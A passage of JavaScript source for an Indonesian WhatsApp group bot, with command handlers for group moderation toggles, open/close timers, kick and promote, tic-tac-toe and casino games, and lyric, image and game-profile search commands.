case 'setppgc': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!quoted) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
await HuBotZ.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
newReply("Berhasil mengganti pp group")
}
break
case 'setname': case 'setsubject': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!text) return newReply(`Example ${prefix + command} WhatsApp Bot`)
await HuBotZ.groupUpdateSubject(m.chat, text).then((res) => newReply("Done")).catch((err) => newReply(jsonformat(err)))
}
break
case 'setdesc': case 'setdesk': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!text) return newReply(`Example ${prefix + command} WhatsApp Bot`)
await HuBotZ.groupUpdateDescription(m.chat, text).then((res) => newReply("Done")).catch((err) => newReply(jsonformat(err)))
}
break
case 'autoaigrup':
case 'aigrup': 
case 'autoaigc': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return newReply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
newReply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return newReply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
newReply('Successfully Disabling Auto AI')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoaijapri':
case "aipc": 
case 'autoaipc': {
if (m.isGroup) return reply('Fitur Khusus Private Chat!')
if (!isCreator) return reply(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('#autoaijapri', m.sender, _cmd)
if (isAutoAiPc) return newReply(`Udah aktif`)
openaipc.push(botNumber)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
newReply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaijapri', m.sender, _cmd)
if (!isAutoAiPc) return newReply(`Udah nonaktif`)
let anu = openaipc.indexOf(botNumber)
openaipc.splice(anu, 1)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
newReply('Successfully Disabling Auto AI')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antilink': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antilink', m.sender, _cmd)
if (isAntiLink) return newReply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
newReply('Successfully Activate Antilink In This Group')
} else if (args[0] === "off") {
addCountCmd('#antilink', m.sender, _cmd)
if (!isAntiLink) return newReply(`Udah nonaktif`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
newReply('Successfully Disabling Antilink In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antilinktt':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antilink2', m.sender, _cmd)
if (isAntiLink2) return newReply(`Udah aktif`)
antilink2.push(m.chat)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
newReply('Successfully Activate antilink2 In This Group')
} else if (args[0] === "off") {
addCountCmd('#antilink2', m.sender, _cmd)
if (!isAntiLink2) return newReply(`Udah nonaktif`)
let anu = antilink2.indexOf(m.chat)
antilink2.splice(anu, 1)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
newReply('Successfully Disabling antilink2 In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'kickme':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#kickme', m.sender, _cmd)
if (isKickMe) return newReply(`Udah aktif`)
kickme.push(m.chat)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
newReply('Successfully Activate Kickme In This Group')
} else if (args[0] === "off") {
addCountCmd('#kickme', m.sender, _cmd)
if (!isKickMe) return newReply(`Udah nonaktif`)
let anu = kickme.indexOf(m.chat)
kickme.splice(anu, 1)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
newReply('Successfully Disabling Kickme In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'accept':
case 'acceptall': {
    if (!m.isGroup) return replygc(mess.OnlyGroup);
    if (!isAdmins && !TheCreator) return reply('*Only Admin*');
    if (!isBotAdmins) return reply('*Bot Bukan Admin!*');  
    if (!global.db.data.group[from]) return reply(`Grup ini belum terdata di database!\nKetik ${prefix}addgrup untuk mendapatkan akses perintah ini`);
    const participants = await HuBotZ.groupRequestParticipantsList(m.chat);  
    if (participants.length === 0) {
        return m.reply("Tidak ada permintaan bergabung saat ini.");
    }
    const successfulJoin = [];
    const unsuccessfulJoin = [];  
    for (const participant of participants) {
        const jid = participant.jid;
        const response = await HuBotZ.groupRequestParticipantsUpdate(m.chat, [jid], "approve");      
        if (response[0]?.status === "200") {
            successfulJoin.push(jid);
        } else {
            unsuccessfulJoin.push(jid);
        }
    }   
    let responseText = "Berhasil menerima permintaan bergabung dari:\n";
    responseText += successfulJoin.map(jid => `- ${jid}`).join("\n");   
    if (unsuccessfulJoin.length > 0) {
        responseText += "\n\nPermintaan bergabung dari beberapa nomor tidak berhasil:\n";
        responseText += unsuccessfulJoin.map(jid => `- ${jid}`).join("\n");
    }  
    m.reply(responseText);
}
break
case 'mute': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return newReply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
newReply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return newReply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
newReply('Successfully Unmute In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antidelete': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isCreator) return reply('Fitur Khusus owner!')
//if (!isBotAdmins) return reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antidelete', m.sender, _cmd)
if (global.antiDelete) return newReply(`Udah aktif`)
global.antiDelete = true
newReply('Successfully Activate antidelete In This bot')
} else if (args[0] === "off") {
addCountCmd('#antidelete', m.sender, _cmd)
if (!global.antiDelete) return newReply(`Udah nonaktif`)
global.antiDelete = false
newReply('Successfully Disabling antidelete In This bot')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case 'antionce':
case 'antivo': 
case 'antiviewonce': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isCreator) return reply('Fitur Khusus owner!')
// if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antionce', m.sender, _cmd)
if (global.antiViewOnce) return reply(`Udah aktif`)
global.antiViewOnce = true
newReply('Successfully Activate Anti view once In This bot')
} else if (args[0] === "off") {
addCountCmd('#antionce', m.sender, _cmd)
if (!global.antiViewOnce) return reply(`Udah nonaktif`)
global.antiViewOnce = false
newReply('Successfully Disabling Anti view once In This bot')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case 'antiwame': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('#antiwame', m.sender, _cmd)
if (isAntiWame) return newReply(`Udah aktif`)
antiwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
newReply('Successfully Activate Antiwame In This Group')
} else if (args[0] === "off") {
addCountCmd('#antiwame', m.sender, _cmd)
if (!isAntiWame) return newReply(`Udah nonaktif`)
let anu = antiwame.indexOf(m.chat)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
newReply('Successfully Disabling Antiwame In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antiwame2': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('#antiwame2', m.sender, _cmd)
if (isAntiWame2) return newReply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
newReply('Successfully Activate antiwame2 In This Group')
} else if (args[0] === "off") {
addCountCmd('#antiwame2', m.sender, _cmd)
if (!isAntiWame2) return newReply(`Udah nonaktif`)
let anu = antiwame2.indexOf(m.chat)
antiwame2.splice(anu, 1)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
newReply('Successfully Disabling antiwame2 In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'opentime': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu Siapa Kocak')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return newReply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
newReply(`Grup Akan Dibuka Dalam ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `Grup Telah Di Buka Oleh Admin\nSekarang Semua Member Dapat Mengirim Pesan`
HuBotZ.groupSettingUpdate(m.chat, 'not_announcement')
newReply(open)
}, timer)
}
break
case'open': case'buka':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#group', m.sender, _cmd)
HuBotZ.groupSettingUpdate(m.chat, 'not_announcement')
const textOpen = await getTextSetOpen(m.chat, set_open);
newReply(textOpen || `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
break
}
case 'setopen': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) return newReply(`Set open sudah ada sebelumnya`)
addSetOpen(text, m.chat, set_open)
addCountCmd('#setopen', m.sender, _cmd)
newReply(`✅ Done set open!`)
}
break
case 'changeopen': case 'changesetopen':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) {
addCountCmd('#changeopen', m.sender, _cmd)
changeSetOpen(text, m.chat, set_open)
newReply(`Sukses ubah set open teks!`)
} else {
addCountCmd('#changeopen', m.sender, _cmd)
addSetOpen(text, m.chat, set_open)
newReply(`Sukses ubah set open teks!`)
}
break
case 'delsetopen':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!isSetOpen(m.chat, set_open)) return newReply(`Belum ada set open di sini..`)
removeSetOpen(m.chat, set_open)
addCountCmd('#delsetopen', m.sender, _cmd)
newReply(`Sukses delete set open`)
break
case 'closetime': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu Siapa Kocak')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'harj') {
var timer = args[0] * `86400000`
} else {
return newReply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
newReply(`Group Akan Ditutup Dalam ${q} Di Mulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
HuBotZ.groupSettingUpdate(m.chat, 'announcement')
newReply(close)
}, timer)
}
break
case 'close': 
case'tutup':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#close', m.sender, _cmd)
HuBotZ.groupSettingUpdate(m.chat, 'announcement')
const textClose = await getTextSetClose(m.chat, set_close);
newReply(textClose || `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
break
case 'setclose':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) return newReply(`Set close sudah ada sebelumnya`)
addSetClose(text, m.chat, set_close)
addCountCmd('#setclose', m.sender, _cmd)
newReply(`✅ Done set close!`)
}
break
case'changeclose': case'changesetclose':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) {
addCountCmd('#changeclose', m.sender, _cmd)
changeSetClose(text, m.chat, set_close)
newReply(`Sukses ubah set close teks!`)
} else {
addCountCmd('#changeclose', m.sender, _cmd)
addSetClose(text, m.chat, set_close)
newReply(`Sukses ubah set close teks!`)
}
break
case 'delsetclose':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!isSetClose(m.chat, set_close)) return newReply(`Belum ada set close di sini..`)
removeSetClose(m.chat, set_close)
addCountCmd('#delsetclose', m.sender, _cmd)
newReply(`Sukses delete set close`)
break
case 'kick': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HuBotZ.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply('Sukses kick target✅')).catch((err) => newReply('Tag/reply pesan target yang ingin di kick!'))
}
break
case 'promote': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HuBotZ.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply('Sukses promote member✅')).catch((err) => newReply('❌ Terjadi kesalahan'))
}
break
case 'demote': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HuBotZ.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply('Sukses demote admin✅')).catch((err) => newReply('❌ Terjadi kesalahan'))
}
break
case 'revoke':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#revoke', m.sender, _cmd)
await HuBotZ.groupRevokeInvite(m.chat)
.then( res => {
newReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => newReply(mess.emror.feature))
break
case 'tagall': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply ('Lu Siapa Kocak?')
let teks = `*👥 Tag All By Admin*
 
🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
HuBotZ.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
break
case 'hidetag': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return reply('Lu siapa kocak?')
HuBotZ.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
}
break
case 'ahihihi': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isCreator) return reply(mess.OnlyOwner)
HuBotZ.sendMessage(m.chat, {
    audio: {
        url: `https://pomf2.lain.la/f/tzq94gbz.mp3`
    }, mimetype: 'audio/mpeg', ptt: true,
mentions: participants.map(a => a.id)})
}
break
case 'delete': 
case 'del': {
if (!m.quoted) throw false
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HuBotZ.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'checksewa': case'ceksewa': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isSewa) return newReply(`Bot tidak di sewa group ini!`)
addCountCmd('#checksewa', m.sender, _cmd)
let ceksewa = ms(_sewa.getSewaExpired(m.chat, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
newReply(sewanya)
}
break
// Game Menu
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return newReply( 'Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
newReply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await HuBotZ.sendText(room.x, str, m, { mentions: parseMention(str) } )
await HuBotZ.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
newReply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return newReply ( `Kamu sedang tidak berada di room tictactoe !`)
delete this.game[roomnya.id]
newReply(`Berhasil delete session room tictactoe !`)
}
break
case 'casino':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (isGame(m.sender, isCreator, gcount, glimit)) return newReply(`Limit game kamu sudah habis`)
if (!text) return newReply(`Kirim perintah *${prefix+command}* @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (fs.existsSync(`./database/${m.chat}.json`)) return newReply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
if (!args[1]) return newReply('Masukan Nominal Nya')
if (args[1].includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return newReply('Nominal Harus Berupa Angka!')
var anu = getBalance(m.sender, balance)
var ani = getBalance(m.mentionedJid[0], balance)
if (anu < args[1] || anu == 'undefined') return newReply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
if (ani < args[1] || ani == 'undefined') return newReply(`Balance Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}balance @tag untuk mengecek Balance lawanmu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
addCountCmd('#casino', m.sender, _cmd)
fs.writeFileSync(`./database/casino/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
gameAdd(m.sender, glimit)
var starGame = `🎰 Memulai Game Casino 💰\n\n• @${m.sender.replace("@s.whatsapp.net", "")} Menantang ${text}, dengan Nominal: *$ ${parseInt(args[1])}*\n• Ketik Y/N untuk menerima atau menolak Permainan!`
HuBotZ.sendMessage(m.chat, { text: starGame, mentions: [m.sender, users] }, { quoted: m })
}
 break
case'delcasino':
if (fs.existsSync('./database/casino/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./database/casino/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (csn.Y.includes(m.sender)) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (isAdmins) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (isCreator) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else {
newReply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
}
} else {
newReply('Tidak ada sesi yang berlangsung')
}
break
// Search Menu
case 'lyric':
case 'lyrics':
case 'lirik': 
case 'liriklagu': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *judul*\n\n_Contoh_\n\n${prefix+command} Bila Nanti`)
newReply(mess.wait)
addCountCmd('#lirik', m.sender, _cmd)
try {
let anu = await fetchJson('http://song-lyrics-api-o0m8tth8t-azharimm.vercel.app/search?q=' + text)
if(!anu.data) return newReply('server eror')
let anuu = await fetchJson (anu.data[0].songLyrics)
let { artist, songTitle, songLyrics} = anuu.data
newReply('*Artis:* ' + artist + '\n*Title*: ' + songTitle + '\n*Lirik*: ' + songLyrics)
}catch (error) {
newReply(`Lirik Lagu Tidak Ditemukan`);
}
db.data.users[m.sender].limit -= 1
}
break
case 'grupwa': 
case 'searchgrup':
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *nama group*\n\n_Contoh_\n\n${prefix+command} store`)
newReply(mess.wait)
addCountCmd('#grupwa', m.sender, _cmd)
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return newReply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
newReply(teks)
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(`Hasil pencarian dari ${q} tidak ditemukan`)
})
db.data.users[m.sender].limit -= 1
break
case 'ffstalk': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!q) return newReply(`Example: ${prefix+command} id`)
newReply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
newReply(`Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!q) return newReply(`Example: ${prefix+command} id|server`)
newReply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
newReply(`Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'igstalk': {
if (!isPremium) return reply(mess.OnlyPrem)
if (!q) return reply(`Contoh: ${prefix+command} nickname`)
reply(mess.wait)
let anu = await fetchJson(`https://xzn.wtf/api/igstalk?user=${q}&apikey=${global.XznKey}`)
const nick = anu.username
const nama = anu.fullname
const post = anu.posts
const foll = anu.followers
const foli = anu.following
const bio = anu.bio
HuBotZ.sendMessage(m.chat, { image: { url: anu.photo_profile}, caption: `Nickname : ${nick}\nFullname : ${nama}\nPostingan : ${post}\nFollowers : ${foll}\nFollowing : ${foli}\nBio : ${bio}`}, {quoted: m})
}
break
case 'pinterest': 
case 'pin': {
if (!isPremium && db.data.users[m.sender].limit < 2) return m.reply(`🇺🇸 You don't have enough limits to use this feature!, because you only have ${db.data.users[m.sender].limit} limit left\n\n🇮🇩 Kamu tidak memiliki cukup limit untuk menggunakan fitur ini!, karena kamu hanya memiliki ${db.data.users[m.sender].limit} limit tersisa`);
if (!text) return reply(`Example ${prefix+command} Anime`)
let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2000);
    const messages = [
        "🇺🇸 *Your Limit is Reduced by 2*\n\n🇮🇩 *Limit Anda Berkurang 2*"
    ];     
    for (let i = 0; i < messages.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
        let limitUserr = `${db.data.users[m.sender]}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
db.data.users[m.sender].limit -= 2
HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
        if (i !== messages.length - 1) {
            await sleep(0);
        }
    }
    await sleep(0);
    try {
let anu = await pinterest(text)
let result = anu[Math.floor(Math.random() * anu.length)]
HuBotZ.sendMessage(m.chat, { image: { url: result }, caption: `*Image Url :* ${result}`}, { quoted: m })
    } catch (error) {
    db.data.users[m.sender].limit += 2
        console.log(error)
        reply(mess.emror.feature);
    }
    }
break
case 'wallpaper': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply('Enter Query Title')
reply(mess.wait)
let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
HuBotZ.sendMessage(m.chat, {caption: `📄 *Title *: ${result.title}\n🗃️ *Category *: ${result.type}\n🔎 *Detail *: ${result.source}\n🌐 *Media Url *: ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
db.data.users[m.sender].limit -= 1
}
break
/*case 'pixivsearch':
case 'pixiv': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);
  if (!text) return reply(`Gunakan dengan cara ${prefix + command} Raiden Shogun`);
  try {
